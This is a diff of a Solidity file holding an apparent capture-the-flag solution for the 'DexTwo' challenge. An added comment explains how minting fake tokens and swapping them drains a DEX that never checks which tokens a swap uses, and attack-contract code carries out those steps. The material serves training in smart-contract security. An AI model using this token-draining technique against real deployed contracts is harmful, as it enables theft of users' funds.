@@ -7,6 +7,25 @@ import "forge-std/console.sol";
 import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 
+/*
+    This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.
+    You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
+    You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.
+    Things that might help:
+        How has the swap method been modified?
+
+    Solution:
+    The DexTwo contract does not check what tokens we are transferring
+    We can mint fake tokens to transfer to DexTwo to get all of DexTwos tokens
+
+    1. Mint 2 fake tokens with total supply = 2
+    2. Donate 1 of each to the DexTwo contract
+    3. Use swap function with the last fake tokens
+    4. Swap amount = amount * toTokenBalance / fromTokenBalance
+        100 = 1 * 100 / 1
+ */
+
+
 interface IDexTwo {
     function token1() external view returns (address);
     function token2() external view returns (address);
@@ -35,7 +54,7 @@ contract DexAttack {
         myToken1.transfer(address(dex), 1);
         myToken2.transfer(address(dex), 1);
 
-        // Approve dex for fake tokens
+        // Approve dex for attack contracts fake tokens
         myToken1.approve(address(dex), 1);
         myToken2.approve(address(dex), 1);
 
